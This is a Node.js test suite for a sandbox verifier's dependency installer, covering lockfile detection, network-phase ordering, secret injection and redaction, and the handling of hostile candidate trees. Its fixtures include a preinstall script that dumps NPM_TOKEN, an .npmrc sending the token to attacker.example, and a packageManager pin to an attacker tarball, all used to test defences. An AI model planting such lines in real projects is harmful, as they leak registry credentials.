/**
 * ADR-0014 §3 describes the install phase as "package registries and `github.com` reachable, for
 * cloning and `npm ci`". The policy existed and the `npm ci` did not, so the verifier ran a
 * repository's declared checks against a tree with no `node_modules`. The first deployed
 * verification to get that far reported `tests: npm run --silent test exited 127` — a blocking
 * failure against a candidate whose four acceptance criteria were all satisfied.
 */

import assert from "node:assert/strict";
import { test } from "node:test";
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { installConfigChanges, installDependencies } from "../dist/sandbox/dependencies.js";
import { FakeSandboxProvider } from "../dist/sandbox/fake.js";
import { runInExecutionPhase } from "../dist/sandbox/lifecycle.js";
import { executionPhasePolicy } from "../dist/sandbox/network-phase.js";
import { fixtureRepo } from "./helpers.js";

async function checkout() {
  const provider = new FakeSandboxProvider();
  return await provider.create({ role: "verifier", repoUrl: fixtureRepo({ test: "node --test" }) });
}

test("a checkout with no lockfile installs nothing and says so", async () => {
  const handle = await checkout();
  try {
    const result = await installDependencies(handle);
    assert.equal(result.status, "skipped");
    assert.equal(result.command, null);
    // The reason names what it looked for, so "skipped" is never a mystery in a run's log.
    assert.match(result.detail, /package-lock\.json/);
  } finally {
    await handle.destroy();
  }
});

test("a package-lock.json picks `npm ci`, not `npm install`", async () => {
  const handle = await checkout();
  try {
    // Deliberately unresolvable, so the command runs and fails rather than reaching a registry:
    // what is under test is which argv was chosen and that a failure is reported, not installed.
    writeFileSync(
      join(handle.checkoutPath, "package-lock.json"),
      JSON.stringify({ name: "x", lockfileVersion: 3, packages: {} }),
    );
    const result = await installDependencies(handle);
    assert.equal(result.command, "npm ci");
    assert.notEqual(result.status, "skipped");
  } finally {
    await handle.destroy();
  }
});

test("a pnpm lockfile wins over a package-lock.json", async () => {
  const handle = await checkout();
  try {
    writeFileSync(join(handle.checkoutPath, "package-lock.json"), "{}");
    writeFileSync(join(handle.checkoutPath, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
    const result = await installDependencies(handle);
    assert.match(result.command, /^pnpm install --frozen-lockfile$/);
  } finally {
    await handle.destroy();
  }
});

test("a failed install is reported, never thrown", async () => {
  const handle = await checkout();
  try {
    // A lockfile that cannot possibly install.
    writeFileSync(join(handle.checkoutPath, "package-lock.json"), "not json at all");
    const result = await installDependencies(handle);
    assert.equal(result.status, "failed");
    assert.match(result.detail, /npm ci/);
  } finally {
    await handle.destroy();
  }
});

/**
 * #220: the same gap, one ecosystem over. A Go or Python repository got `status: "skipped"` with
 * a detail naming only the npm lockfiles it had looked for, so its checks ran against a tree with
 * no modules and no site-packages.
 */

test("a go.mod picks `go mod download`", async () => {
  const handle = await checkout();
  try {
    writeFileSync(join(handle.checkoutPath, "go.mod"), "module example.com/x\n\ngo 1.22\n");
    const result = await installDependencies(handle);
    assert.equal(result.command, "go mod download");
    assert.equal(result.status, "installed");
    assert.equal(result.installs.length, 1);
    assert.equal(result.installs[0].ecosystem, "go");
  } finally {
    await handle.destroy();
  }
});

test("Python lockfiles win over requirements.txt, uv over poetry", async () => {
  for (const [files, expected] of [
    [{ "uv.lock": "version = 1\n", "requirements.txt": "flask\n" }, "uv sync --frozen"],
    [{ "poetry.lock": "# lock\n", "requirements.txt": "flask\n" }, "poetry install --sync"],
    [{ "uv.lock": "version = 1\n", "poetry.lock": "# lock\n" }, "uv sync --frozen"],
    [{ "requirements.txt": "flask==3.0.0\n" }, "pip install -r requirements.txt"],
  ]) {
    const handle = await checkout();
    try {
      for (const [name, content] of Object.entries(files)) {
        writeFileSync(join(handle.checkoutPath, name), content);
      }
      const result = await installDependencies(handle);
      assert.equal(result.command, expected, JSON.stringify(files));
    } finally {
      await handle.destroy();
    }
  }
});

test("a requirements.txt install says plainly that the tree is not reproducible", async () => {
  const handle = await checkout();
  try {
    // Nothing to resolve, so the install succeeds offline and the detail is what is under test.
    writeFileSync(join(handle.checkoutPath, "requirements.txt"), "");
    const result = await installDependencies(handle);
    assert.equal(result.status, "installed");
    assert.match(result.detail, /not reproducible/);
    assert.match(result.detail, /transitive/);
  } finally {
    await handle.destroy();
  }
});

test("a lockfile per ecosystem means an install per ecosystem", async () => {
  const handle = await checkout();
  try {
    writeFileSync(join(handle.checkoutPath, "go.mod"), "module example.com/x\n\ngo 1.22\n");
    writeFileSync(join(handle.checkoutPath, "requirements.txt"), "");
    const result = await installDependencies(handle);

    // A polyglot repo's checks span both trees, and `go build` cannot fetch modules later:
    // egress has narrowed by the time any check runs.
    assert.deepEqual(
      result.installs.map((i) => i.ecosystem),
      ["python", "go"],
    );
    assert.equal(result.command, "pip install -r requirements.txt && go mod download");
  } finally {
    await handle.destroy();
  }
});

test("an installer that is not on PATH is reported as that, not as a failed install", async () => {
  const handle = await checkout();
  try {
    writeFileSync(join(handle.checkoutPath, "poetry.lock"), "# lock\n");
    // The fake sandbox is this machine, so which binaries exist is not this test's to assume:
    // it asserts the shape of the report either way, and the PATH wording only when absent.
    const result = await installDependencies(handle);
    assert.equal(result.installs.length, 1);
    if (result.status === "failed" && /not on this sandbox image's PATH/.test(result.detail)) {
      assert.match(result.detail, /poetry\.lock/);
    }
    assert.notEqual(result.status, "skipped");
  } finally {
    await handle.destroy();
  }
});

test("the skipped detail names every marker across every ecosystem", async () => {
  const handle = await checkout();
  try {
    const result = await installDependencies(handle);
    for (const marker of ["package-lock.json", "uv.lock", "poetry.lock", "requirements.txt", "go.mod"]) {
      assert.match(result.detail, new RegExp(marker.replace(".", "\\.")));
    }
  } finally {
    await handle.destroy();
  }
});

test("the install runs in the install phase and never touches the network policy", async () => {
  const handle = await checkout();
  try {
    writeFileSync(join(handle.checkoutPath, "go.mod"), "module example.com/x\n\ngo 1.22\n");
    writeFileSync(join(handle.checkoutPath, "requirements.txt"), "");
    await installDependencies(handle);

    // Nothing here widens or narrows egress: the install *is* the install phase, and the only
    // policy change in a sandbox's life is the one-way narrowing `runInExecutionPhase` applies.
    assert.equal(handle.calls.filter((c) => c.type === "policy").length, 0);

    await runInExecutionPhase(handle, "api.openai.com", [], "go", { args: ["version"] });

    const narrowed = handle.calls.findIndex((c) => c.type === "policy");
    const installExecs = handle.calls
      .map((c, i) => (c.type === "exec" && ["go", "pip"].includes(c.command) ? i : -1))
      .filter((i) => i !== -1 && i < narrowed);
    assert.equal(installExecs.length, 2, "both installs should run before egress narrows");
    // And the narrowing is to the execution-phase allowlist, not back to the install one.
    assert.deepEqual(handle.calls[narrowed].policy, executionPhasePolicy("api.openai.com"));
    assert.ok(
      handle.calls.every(
        (c) => c.type !== "policy" || c.policy.allowedDomains.join() === "api.openai.com",
      ),
      "egress must never be re-widened after the execution phase begins",
    );
  } finally {
    await handle.destroy();
  }
});

// --- repository secrets in the install environment (ADR-0014 §5) -------------

/**
 * A handle that records the environment its exec was given, so the injection can be asserted
 * rather than inferred from an install's exit code.
 *
 * Wrapping a real `FakeSandboxProvider` handle rather than inventing one: `installDependencies`
 * reaches `exists` and `checkoutPath` as well, and a hand-built double would drift from the
 * `SandboxHandle` contract exactly where this test stops looking.
 */
function envRecording(handle) {
  const calls = [];
  return {
    handle: {
      ...handle,
      checkoutPath: handle.checkoutPath,
      exists: (path) => handle.exists(path),
      exec: (command, options) => {
        calls.push({ command, env: options.env });
        return handle.exec(command, options);
      },
    },
    calls,
  };
}

test("a repository secret reaches the install command's environment and nothing else", async () => {
  const real = await checkout();
  try {
    writeFileSync(join(real.checkoutPath, "package-lock.json"), "not json at all");
    const { handle, calls } = envRecording(real);
    const result = await installDependencies(handle, { secrets: { NPM_TOKEN: "s3cret" } });

    assert.equal(calls.length, 1, "the install is the only command that may see a secret");
    assert.equal(calls[0].env.NPM_TOKEN, "s3cret");
    assert.equal(calls[0].env.CI, "1", "the installer's own variables are still there");
    // Names in the transcript, values never. An install that failed *with* a credential is a
    // different diagnosis from one that failed without.
    assert.match(result.detail, /with repository secrets: NPM_TOKEN/);
    assert.ok(!result.detail.includes("s3cret"), "a value must never reach a run's evidence");
  } finally {
    await real.destroy();
  }
});

test("a repository secret can override the installer's own variables but not PATH", async () => {
  const real = await checkout();
  try {
    writeFileSync(join(real.checkoutPath, "package-lock.json"), "not json at all");
    const { handle, calls } = envRecording(real);
    /*
     * Pointing the resolver at a private registry is the main thing a repository wants, so secrets
     * are merged last and `npm_config_registry` is overridable. `PATH` is not reachable at all,
     * because `assertSecretKey` refuses the name before it can be stored — this asserts the merge
     * order that makes the first half work, and `repository-secrets.test.js` asserts the refusal
     * that makes the second half unnecessary.
     */
    await installDependencies(handle, {
      secrets: { npm_config_registry: "https://registry.internal/" },
    });
    assert.equal(calls[0].env.npm_config_registry, "https://registry.internal/");
  } finally {
    await real.destroy();
  }
});

test("a secret that could not be opened is named in the detail, not silently dropped", async () => {
  const real = await checkout();
  try {
    writeFileSync(join(real.checkoutPath, "package-lock.json"), "not json at all");
    const result = await installDependencies(real, { unopenableSecrets: ["NPM_TOKEN"] });
    /*
     * The failure this exists for: a rotated key pair, an install that fails on a registry's own
     * 401, and nothing anywhere in the evidence mentioning a secret. One clause turns that into a
     * rotation.
     */
    assert.match(result.detail, /could not be opened and were NOT injected: NPM_TOKEN/);
    assert.match(result.detail, /WINDKEEL_SECRET_PRIVATE_KEY/);
  } finally {
    await real.destroy();
  }
});

// --- Candidate trees: maker-authored, so hostile (ADR-0014, 2026-10-16 amendment) ---

/**
 * A handle whose `exec` is scripted, so a test can make an installer print whatever it likes.
 * `exists` answers from `markers`; every exec is recorded with its argv and environment.
 */
function scriptedHandle(markers, respond, { configDiff = "", packageManager = {} } = {}) {
  const calls = [];
  const gitCalls = [];
  return {
    calls,
    gitCalls,
    handle: {
      checkoutPath: "/checkout",
      exists: async (path) => markers.some((m) => path === `/checkout/${m}`),
      exec: async (command, options = {}) => {
        const args = options.args ?? [];
        // The base-tree comparison's git calls are answered here and kept off `calls`, which is
        // the installers' timeline.
        if (command === "git") {
          gitCalls.push(args);
          if (args.includes("diff")) return { status: 0, signal: null, stdout: configDiff, stderr: "" };
          const rev = args[args.length - 1].split(":")[0];
          const pm = packageManager[rev];
          return { status: 0, signal: null, stdout: JSON.stringify(pm ? { packageManager: pm } : {}), stderr: "" };
        }
        calls.push({ command, args, env: options.env ?? {} });
        return respond(command, args, options.env ?? {});
      },
    },
  };
}

const succeed = () => ({ status: 0, signal: null, stdout: "", stderr: "" });

test("a candidate tree installs with lifecycle scripts off, and runs them apart from the secrets", async () => {
  const { handle, calls } = scriptedHandle(["package-lock.json"], succeed);
  const result = await installDependencies(handle, {
    secrets: { NPM_TOKEN: "npm_secret_value_123" },
    candidateTree: true, trustedBase: "HEAD",
  });

  assert.equal(calls.length, 2, "the resolving install, then the scripts");
  assert.equal(calls[0].command, "npm");
  assert.deepEqual(calls[0].args, ["ci", "--ignore-scripts"], "the install that holds the secret runs no scripts");
  assert.equal(calls[0].env.NPM_TOKEN, "npm_secret_value_123");
  assert.equal(calls[0].env.npm_config_ignore_scripts, "true");

  assert.deepEqual([calls[1].command, ...calls[1].args], ["npm", "rebuild"]);
  assert.ok(!("NPM_TOKEN" in calls[1].env), "the scripts run without the repository secret");
  assert.ok(!Object.values(calls[1].env).includes("npm_secret_value_123"), "under any name");

  assert.equal(result.status, "installed");
  assert.match(result.detail, /lifecycle scripts ran separately, without repository secrets/);
});

test("pnpm and yarn candidate installs ignore scripts too; yarn says it skipped them", async () => {
  {
    const { handle, calls } = scriptedHandle(["pnpm-lock.yaml"], succeed);
    await installDependencies(handle, { candidateTree: true });
    assert.deepEqual(calls[0].args, ["install", "--frozen-lockfile", "--ignore-scripts", "--ignore-pnpmfile"]);
    assert.deepEqual([calls[1].command, ...calls[1].args], ["pnpm", "rebuild"]);
  }
  {
    const { handle, calls } = scriptedHandle(["yarn.lock"], succeed);
    const result = await installDependencies(handle, { candidateTree: true });
    assert.deepEqual(calls[0].args, ["install", "--frozen-lockfile", "--ignore-scripts"]);
    assert.equal(calls[0].env.YARN_ENABLE_SCRIPTS, "false");
    assert.equal(calls.length, 1, "no separable script step for yarn");
    assert.match(result.detail, /lifecycle scripts were not run/);
  }
});

test("the maker's install of the base tree is unchanged: scripts on, one command", async () => {
  const { handle, calls } = scriptedHandle(["package-lock.json"], succeed);
  await installDependencies(handle, { secrets: { NPM_TOKEN: "npm_secret_value_123" } });
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0].args, ["ci"]);
});

test("a Python candidate install says plainly that its build code saw the secrets", async () => {
  const { handle } = scriptedHandle(["poetry.lock"], succeed);
  const result = await installDependencies(handle, {
    secrets: { PIP_TOKEN: "pip_secret_value_1" },
    candidateTree: true, trustedBase: "HEAD",
  });
  assert.match(result.detail, /cannot install without executing the tree's own build code/);
});

test("secret values are redacted from a persisted install detail, raw and encoded", async () => {
  const secret = "ghp_R3allyS3cretTokenValue";
  const leaked = [
    `npm ERR! token ${secret}`,
    // `echo $NPM_TOKEN | base64` — the trailing newline changes the encoding's last characters.
    Buffer.from(`${secret}\n`).toString("base64"),
    // Inside a longer base64 stream at another alignment: an `Authorization: Basic` header.
    Buffer.from(`x-access-token:${secret}`).toString("base64"),
    // In a URL, as a resolver echoing its registry would print it.
    `https://user:${encodeURIComponent(`${secret}/+`)}@registry.internal/`,
  ].join("\n");
  const { handle } = scriptedHandle(["package-lock.json"], () => ({
    status: 1,
    signal: null,
    stdout: "",
    stderr: leaked,
  }));
  const result = await installDependencies(handle, {
    secrets: { NPM_TOKEN: secret, OTHER: `${secret}/+` },
    candidateTree: true, trustedBase: "HEAD",
  });

  assert.equal(result.status, "failed");
  const persisted = JSON.stringify(result);
  assert.ok(!persisted.includes(secret), "raw value");
  assert.ok(!persisted.includes(Buffer.from(secret).toString("base64").slice(0, 20)), "base64 value");
  assert.ok(
    !persisted.includes(Buffer.from(`x-access-token:${secret}`).toString("base64").slice(20, 40)),
    "base64 value at another alignment",
  );
  assert.ok(!persisted.includes(encodeURIComponent(`${secret}/+`)), "URL-encoded value");
  assert.match(result.detail, /\[REDACTED\]/, "and the reader can see something was removed");
  assert.match(result.detail, /with repository secrets: NPM_TOKEN, OTHER/, "names survive");
});

test("a real npm candidate install never runs a preinstall with the secret in its environment", async () => {
  const handle = await checkout();
  try {
    const marker = join(handle.checkoutPath, "..", `preinstall-${process.pid}-${Date.now()}`);
    // The attack: a maker-added preinstall that writes the token out. No network needed — the
    // file stands in for an exfiltration, and a lockfile with no packages keeps `npm ci` offline.
    writeFileSync(
      join(handle.checkoutPath, "package.json"),
      JSON.stringify({
        name: "candidate",
        version: "1.0.0",
        scripts: {
          preinstall: `node -e "require('fs').writeFileSync('${marker}', process.env.NPM_TOKEN || 'absent')"`,
        },
      }),
    );
    writeFileSync(
      join(handle.checkoutPath, "package-lock.json"),
      JSON.stringify({
        name: "candidate",
        version: "1.0.0",
        lockfileVersion: 3,
        requires: true,
        packages: { "": { name: "candidate", version: "1.0.0" } },
      }),
    );
    const result = await installDependencies(handle, {
      secrets: { NPM_TOKEN: "npm_real_install_secret" },
      candidateTree: true, trustedBase: "HEAD",
    });
    assert.notEqual(result.status, "skipped");
    if (existsSync(marker)) {
      // `npm rebuild` may run the root project's scripts; if it did, it did so without the token.
      assert.equal(readFileSync(marker, "utf8"), "absent", "the preinstall saw the secret");
      rmSync(marker, { force: true });
    }
  } finally {
    await handle.destroy();
  }
});

// --- Candidate install configuration (PR #356 review) ---

test("a pnpm candidate install also ignores the pnpmfile, which --ignore-scripts does not", async () => {
  const { handle, calls } = scriptedHandle(["pnpm-lock.yaml"], succeed);
  await installDependencies(handle, { secrets: { NPM_TOKEN: "npm_secret_value_123" }, candidateTree: true, trustedBase: "base" });
  assert.ok(calls[0].args.includes("--ignore-pnpmfile"), calls[0].args.join(" "));
  assert.ok(calls[0].args.includes("--ignore-scripts"));
});

test("a candidate that changed install configuration gets no secrets, and the detail says why", async () => {
  for (const changed of [".npmrc", ".pnpmfile.cjs", ".yarnrc.yml", ".yarn/releases/yarn-4.cjs", "packages/a/.npmrc"]) {
    const { handle, calls } = scriptedHandle(["package-lock.json"], succeed, { configDiff: `${changed}\n` });
    const result = await installDependencies(handle, {
      secrets: { NPM_TOKEN: "npm_secret_value_123" },
      candidateTree: true,
      trustedBase: "base",
    });
    for (const call of calls) {
      assert.ok(!Object.values(call.env).includes("npm_secret_value_123"), `${changed}: secret reached ${call.command}`);
    }
    assert.match(result.detail, /WITHHELD/);
    assert.ok(result.detail.includes(changed), `${changed} named in the detail`);
  }
});

test("a changed packageManager pin withholds the secrets too", async () => {
  const { handle, calls } = scriptedHandle(["pnpm-lock.yaml"], succeed, {
    packageManager: { base: "pnpm@9.0.0", HEAD: "pnpm@https://github.com/attacker/pnpm.tgz" },
  });
  const result = await installDependencies(handle, {
    secrets: { NPM_TOKEN: "npm_secret_value_123" },
    candidateTree: true,
    trustedBase: "base",
  });
  assert.ok(!("NPM_TOKEN" in calls[0].env));
  assert.match(result.detail, /package\.json#packageManager/);
});

test("with no trusted base to compare against, a candidate install gets no secrets", async () => {
  const { handle, calls } = scriptedHandle(["package-lock.json"], succeed);
  const result = await installDependencies(handle, { secrets: { NPM_TOKEN: "npm_secret_value_123" }, candidateTree: true });
  assert.ok(!("NPM_TOKEN" in calls[0].env));
  assert.match(result.detail, /could not be compared/);
});

test("unchanged install configuration keeps the secrets: the repository's own .npmrc is §5's case", async () => {
  const { handle, calls } = scriptedHandle(["package-lock.json"], succeed);
  await installDependencies(handle, { secrets: { NPM_TOKEN: "npm_secret_value_123" }, candidateTree: true, trustedBase: "base" });
  assert.equal(calls[0].env.NPM_TOKEN, "npm_secret_value_123");
});

test("against a real repository: a candidate commit that edits .npmrc is detected", async () => {
  const handle = await checkout();
  try {
    const git = (...args) => spawnSync("git", args, { cwd: handle.checkoutPath, encoding: "utf8" });
    const base = git("rev-parse", "HEAD").stdout.trim();
    assert.deepEqual(await installConfigChanges(handle, base), [], "nothing changed yet");
    writeFileSync(
      join(handle.checkoutPath, ".npmrc"),
      "registry=https://attacker.example/\n//attacker.example/:_authToken=${NPM_TOKEN}\n",
    );
    git("add", ".npmrc");
    git("-c", "user.name=m", "-c", "user.email=m@x", "commit", "-q", "-m", "candidate");
    assert.deepEqual(await installConfigChanges(handle, base), [".npmrc"]);
    assert.equal(await installConfigChanges(handle, "not-a-revision"), null, "unknown base fails closed");
  } finally {
    await handle.destroy();
  }
});
